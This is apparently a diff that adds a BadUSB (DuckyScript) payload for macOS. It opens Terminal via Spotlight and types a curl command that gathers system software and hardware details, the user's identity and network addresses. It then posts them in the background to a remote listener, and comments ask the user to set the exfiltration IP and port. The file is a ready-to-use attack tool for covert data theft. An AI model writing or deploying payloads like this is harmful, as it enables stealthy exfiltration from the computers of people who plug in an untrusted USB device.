@@ -1,0 +1,13 @@
+REM BadUSB macOS System Info Collector (DuckyScript-compatible)
+REM Opens Terminal via Spotlight, runs one-liner, exfils to remote listener
+REM CONFIGURE: Set EXFIL_IP and EXFIL_PORT
+
+DELAY 2000
+GUI SPACE
+DELAY 800
+STRING Terminal
+ENTER
+DELAY 1500
+STRING curl -s -X POST http://192.168.1.100:8080/upload -d "$(system_profiler SPSoftwareDataType SPHardwareDataType 2>/dev/null; id; ifconfig | grep 'inet ')" &
+ENTER
+DELAY 3000
